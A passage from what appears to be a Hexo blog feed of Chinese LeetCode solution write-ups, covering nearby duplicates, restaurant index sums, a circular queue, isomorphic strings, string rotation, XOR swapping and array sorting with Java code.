<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsNearbyDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">		Map&lt;Integer, List&lt;Integer&gt;&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (map.containsKey(nums[i])) &#123;</span><br><span class="line">				List&lt;Integer&gt; list = map.get(nums[i]);</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> num : list) &#123;</span><br><span class="line">					<span class="keyword">if</span> (k &gt;= Math.abs(num - i)) &#123;</span><br><span class="line">						<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">					&#125; </span><br><span class="line">				&#125;</span><br><span class="line">				map.get(nums[i]).add(i);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">				list.add(i);</span><br><span class="line">				map.put(nums[i], list);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>使用HashSet。</p>
<p>遍历数组，对于每个元素做以下操作：</p>
<ol>
<li>在散列表中搜索当前元素，如果找到了就返回 <code>true</code>。</li>
<li>在散列表中插入当前元素。</li>
<li>如果当前散列表的大小超过了 kkk， 删除散列表中最旧的元素。</li>
</ol>
<p>返回false</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsNearbyDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    Set&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (set.contains(nums[i])) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        set.add(nums[i]);</span><br><span class="line">        <span class="keyword">if</span> (set.size() &gt; k) &#123;</span><br><span class="line">            set.remove(nums[i - k]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>599. 两个列表的最小索引总和</title>
    <url>/2020/04/02/LeetCode/leetcode-000599-%E4%B8%A4%E4%B8%AA%E5%88%97%E8%A1%A8%E7%9A%84%E6%9C%80%E5%B0%8F%E7%B4%A2%E5%BC%95%E6%80%BB%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>假设Andy和Doris想在晚餐时选择一家餐厅，并且他们都有一个表示最喜爱餐厅的列表，每个餐厅的名字用字符串表示。</p>
<p>你需要帮助他们用<strong>最少的索引和</strong>找出他们<strong>共同喜爱的餐厅</strong>。 如果答案不止一个，则输出所有答案并且不考虑顺序。 你可以假设总是存在一个答案。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">[<span class="string">"Shogun"</span>, <span class="string">"Tapioca Express"</span>, <span class="string">"Burger King"</span>, <span class="string">"KFC"</span>]</span><br><span class="line">[<span class="string">"Piatti"</span>, <span class="string">"The Grill at Torrey Pines"</span>, <span class="string">"Hungry Hunter Steakhouse"</span>, <span class="string">"Shogun"</span>]</span><br><span class="line">输出: [<span class="string">"Shogun"</span>]</span><br><span class="line">解释: 他们唯一共同喜爱的餐厅是“Shogun”。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">[<span class="string">"Shogun"</span>, <span class="string">"Tapioca Express"</span>, <span class="string">"Burger King"</span>, <span class="string">"KFC"</span>]</span><br><span class="line">[<span class="string">"KFC"</span>, <span class="string">"Shogun"</span>, <span class="string">"Burger King"</span>]</span><br><span class="line">输出: [<span class="string">"Shogun"</span>]</span><br><span class="line">解释: 他们共同喜爱且具有最小索引和的餐厅是“Shogun”，它有最小的索引和<span class="number">1</span>(<span class="number">0</span>+<span class="number">1</span>)。</span><br></pre></td></tr></table></figure>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示:"></a>提示:</h2><ul>
<li>两个列表的长度范围都在 [1, 1000]内。</li>
<li>两个列表中的字符串的长度将在[1，30]的范围内。</li>
<li>下标从0开始，到列表的长度减1。</li>
<li>两个列表都没有重复的元素。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用HashMap。</p>
<p>双重循环遍历list1和list2，找到所有相同的爱好的索引和以及它们对应的餐馆。</p>
<p>再遍历一次HashMap，找到最小的，返回即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] findRestaurant(String[] list1, String[] list2) &#123;</span><br><span class="line">		HashMap&lt;Integer, List&lt;String&gt;&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; list1.length; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; list2.length; j++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (list1[i].equals(list2[j])) &#123;</span><br><span class="line">					<span class="keyword">if</span> (!map.containsKey(i + j)) &#123;</span><br><span class="line">						map.put(i + j, <span class="keyword">new</span> ArrayList&lt;String&gt;());</span><br><span class="line">					&#125;</span><br><span class="line">					map.get(i + j).add(list1[i]);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> key : map.keySet()) &#123;</span><br><span class="line">			min = min &lt; key ? min : key;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		String[] res = <span class="keyword">new</span> String[map.get(min).size()];</span><br><span class="line">		<span class="keyword">return</span> map.get(min).toArray(res);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>使用HashMap，解法一优化版</p>
<p>这里我们其实只需要保存最小的索引和就可以了，如果在遍历的过程中发现新的索引和比当前的小，就更新最小的索引和及其对应的值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] findRestaurant(String[] list1, String[] list2) &#123;</span><br><span class="line">		HashMap&lt;String, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;String, Integer&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; list1.length; i++) &#123;</span><br><span class="line">			map.put(list1[i], i);</span><br><span class="line">		&#125;</span><br><span class="line">		List&lt;String&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		<span class="keyword">int</span> min_sum = Integer.MAX_VALUE, sum;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; list2.length &amp;&amp; j &lt;= min_sum; j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (map.containsKey(list2[j])) &#123;</span><br><span class="line">				sum = j + map.get(list2[j]);</span><br><span class="line">				<span class="keyword">if</span> (sum &lt; min_sum) &#123;</span><br><span class="line">					res.clear();</span><br><span class="line">					res.add(list2[j]);</span><br><span class="line">					min_sum = sum;</span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum == min_sum)</span><br><span class="line">					res.add(list2[j]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> res.toArray(<span class="keyword">new</span> String[res.size()]);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>622. 设计循环队列</title>
    <url>/2020/04/02/LeetCode/leetcode-000622-%E8%AE%BE%E8%AE%A1%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>设计你的循环队列实现。 循环队列是一种线性数据结构，其操作表现基于 FIFO（先进先出）原则并且队尾被连接在队首之后以形成一个循环。它也被称为“环形缓冲器”。</p>
<p>循环队列的一个好处是我们可以利用这个队列之前用过的空间。在一个普通队列里，一旦一个队列满了，我们就不能插入下一个元素，即使在队列前面仍有空间。但是使用循环队列，我们能使用这些空间去存储新的值。</p>
<p>你的实现应该支持如下操作：</p>
<ul>
<li>MyCircularQueue(k): 构造器，设置队列长度为 k 。</li>
<li>Front: 从队首获取元素。如果队列为空，返回 -1 。</li>
<li>Rear: 获取队尾元素。如果队列为空，返回 -1 。</li>
<li>enQueue(value): 向循环队列插入一个元素。如果成功插入则返回真。</li>
<li>deQueue(): 从循环队列中删除一个元素。如果成功删除则返回真。</li>
<li>isEmpty(): 检查循环队列是否为空。</li>
<li>isFull(): 检查循环队列是否已满</li>
</ul>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MyCircularQueue circularQueue &#x3D; new MycircularQueue(3); &#x2F;&#x2F; 设置长度为 3</span><br><span class="line"></span><br><span class="line">circularQueue.enQueue(1);  &#x2F;&#x2F; 返回 true</span><br><span class="line"></span><br><span class="line">circularQueue.enQueue(2);  &#x2F;&#x2F; 返回 true</span><br><span class="line"></span><br><span class="line">circularQueue.enQueue(3);  &#x2F;&#x2F; 返回 true</span><br><span class="line"></span><br><span class="line">circularQueue.enQueue(4);  &#x2F;&#x2F; 返回 false，队列已满</span><br><span class="line"></span><br><span class="line">circularQueue.Rear();  &#x2F;&#x2F; 返回 3</span><br><span class="line"></span><br><span class="line">circularQueue.isFull();  &#x2F;&#x2F; 返回 true</span><br><span class="line"></span><br><span class="line">circularQueue.deQueue();  &#x2F;&#x2F; 返回 true</span><br><span class="line"></span><br><span class="line">circularQueue.enQueue(4);  &#x2F;&#x2F; 返回 true</span><br><span class="line"></span><br><span class="line">circularQueue.Rear();  &#x2F;&#x2F; 返回 4</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>所有的值都在 0 至 1000 的范围内；</li>
<li>操作数将在 1 至 1000 的范围内；</li>
<li>请不要使用内置的队列库。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用ArrayList模拟</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyCircularQueue</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">private</span> ArrayList&lt;Integer&gt; values;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> front;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> back;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	    <span class="comment">/** Initialize your data structure here. Set the size of the queue to be k. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="title">MyCircularQueue</span><span class="params">(<span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">	    	values = <span class="keyword">new</span> ArrayList&lt;&gt;(Collections.nCopies(k, -<span class="number">1</span>));</span><br><span class="line">	    	front = <span class="number">0</span>;</span><br><span class="line">	    	back = -<span class="number">1</span>;</span><br><span class="line">	    	size = <span class="number">0</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Insert an element into the circular queue. Return true if the operation is successful. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">enQueue</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">	    	<span class="keyword">if</span> (size == values.size()) &#123;</span><br><span class="line">	    		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line">	    	back = (back + <span class="number">1</span>) % values.size();</span><br><span class="line">	    	values.set(back, value);</span><br><span class="line">	    	size++;</span><br><span class="line">	    	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Delete an element from the circular queue. Return true if the operation is successful. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">deQueue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	    	<span class="keyword">if</span> (<span class="number">0</span> == size) &#123;</span><br><span class="line">	    		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line">	    	values.set(front, -<span class="number">1</span>);</span><br><span class="line">	    	front = (front + <span class="number">1</span>) % values.size();</span><br><span class="line">	    	size--;</span><br><span class="line">	    	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Get the front item from the queue. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">Front</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	    	<span class="keyword">if</span> (<span class="number">0</span> == size) &#123;</span><br><span class="line">	    		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line">	    	<span class="keyword">return</span> values.get(front);</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Get the last item from the queue. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">Rear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	    	<span class="keyword">if</span> (<span class="number">0</span> == size) &#123;</span><br><span class="line">	    		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line">	    	<span class="keyword">return</span> values.get(back);</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Checks whether the circular queue is empty or not. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	    	<span class="keyword">return</span> <span class="number">0</span> == size;</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Checks whether the circular queue is full or not. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isFull</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	    	<span class="keyword">return</span> values.size() == size;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>设计</tag>
        <tag>队列</tag>
        <tag>循环队列</tag>
      </tags>
  </entry>
  <entry>
    <title>205. 同构字符串</title>
    <url>/2020/04/02/LeetCode/leetcode-000205-%E5%90%8C%E6%9E%84%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个字符串 s 和 t，判断它们是否是同构的。</p>
<p>如果 s 中的字符可以被替换得到 t ，那么这两个字符串是同构的。</p>
<p>所有出现的字符都必须用另一个字符替换，同时保留字符的顺序。两个字符不能映射到同一个字符上，但字符可以映射自己本身。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: s = <span class="string">"egg"</span>, t = <span class="string">"add"</span></span><br><span class="line">输出: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: s = <span class="string">"foo"</span>, t = <span class="string">"bar"</span></span><br><span class="line">输出: <span class="keyword">false</span></span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: s = <span class="string">"paper"</span>, t = <span class="string">"title"</span></span><br><span class="line">输出: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>

<h2 id="说明"><a href="#说明" class="headerlink" title="说明:"></a>说明:</h2><p> 你可以假设 <strong><em>s</em></strong> 和 <strong>t</strong> 具有相同的长度。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>遍历一次字符串，使用HashMap保存之前的映射关系。</p>
<p>以s在i位置上的字符c为key，t在i位置上的字符c1为value。</p>
<p>在遍历的过程中判断：</p>
<ol>
<li>如果s中的当前字符c没有在map中，但是t的当前字符c1已经在map中了，说明c对应的字符c1已经被映射过一次了，返回false</li>
<li>如果s中的当前字符c在map中，则判断它们的映射字符是不是相等，不相等，返回false</li>
</ol>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isIsomorphic</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (s.length() != t.length()) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		HashMap&lt;Character, Character&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">			<span class="keyword">char</span> sc = s.charAt(i);</span><br><span class="line">			<span class="keyword">char</span> tc = t.charAt(i);</span><br><span class="line">			<span class="keyword">if</span> (!map.containsKey(sc)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (map.containsValue(tc)) &#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				map.put(sc, tc);</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (map.get(sc) != tc) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题 01.09. 字符串轮转</title>
    <url>/2020/04/02/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98%2001.09-%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AE%E8%BD%AC/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>字符串轮转。给定两个字符串<code>s1</code>和<code>s2</code>，请编写代码检查<code>s2</code>是否为<code>s1</code>旋转而成（比如，<code>waterbottle</code>是<code>erbottlewat</code>旋转后的字符串）。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s1 &#x3D; &quot;waterbottle&quot;, s2 &#x3D; &quot;erbottlewat&quot;</span><br><span class="line">输出：True</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s1 &#x3D; &quot;aa&quot;, &quot;aba&quot;</span><br><span class="line">输出：False</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><p>字符串长度在[0, 100000]范围内。</p>
<h2 id="进阶："><a href="#进阶：" class="headerlink" title="进阶："></a>进阶：</h2><p>你能只调用一次检查子串的方法吗？</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>如果s2是s1的轮转，那么s1 + s1一定包含s2。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isFlipedString</span><span class="params">(String s1, String s2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s1.length() != s2.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (s1 + s1).contains(s2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题 16.01. 交换数字</title>
    <url>/2020/04/02/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98%2016.01-%E4%BA%A4%E6%8D%A2%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个函数，不用临时变量，直接交换<code>numbers = [a, b]</code>中<code>a</code>与<code>b</code>的值。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: numbers &#x3D; [1,2]</span><br><span class="line">输出: [2,1]</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><p>numbers.length == 2</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用位运算符</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] swapNumbers(<span class="keyword">int</span>[] numbers) &#123;</span><br><span class="line">        numbers[<span class="number">0</span>] = numbers[<span class="number">0</span>] ^ numbers[<span class="number">1</span>];</span><br><span class="line">        numbers[<span class="number">1</span>] = numbers[<span class="number">0</span>] ^ numbers[<span class="number">1</span>];</span><br><span class="line">        numbers[<span class="number">0</span>] = numbers[<span class="number">0</span>] ^ numbers[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">return</span> numbers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>912. 排序数组</title>
    <url>/2020/03/31/LeetCode/leetcode-000912-%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数数组 <code>nums</code>，将该数组升序排列。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[5,2,3,1]</span><br><span class="line">输出：[1,2,3,5]</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[5,2,3,1]</span><br><span class="line">输出：[1,2,3,5]</span><br></pre></td></tr></table></figure>

<h2 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3:"></a>Example 3:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: nums = [<span class="number">1</span>], index = [<span class="number">0</span>]</span><br><span class="line">Output: [<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示:"></a>提示:</h2><ul>
<li><code>1 &lt;= A.length &lt;= 10000</code></li>
<li><code>-50000 &lt;= A[i] &lt;= 50000</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用库函数</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] sortArray(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>手写快排</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] sortArray(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        quickSort(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pivot = nums[left];</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; nums[right] &gt;= pivot) &#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            nums[left] = nums[right];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; nums[left] &lt;= pivot) &#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            nums[right] = nums[left];</span><br><span class="line">        &#125;</span><br><span class="line">        nums[left] = pivot;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">int</span> index = partition(nums, left, right);</span><br><span class="line">            quickSort(nums, left, index - <span class="number">1</span>);</span><br><span class="line">            quickSort(nums, index + <span class="number">1</span>, right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>计数排序.</p>
<p>在LeetCode上提交之后发现比解法二中的快排还快了1ms。</p>
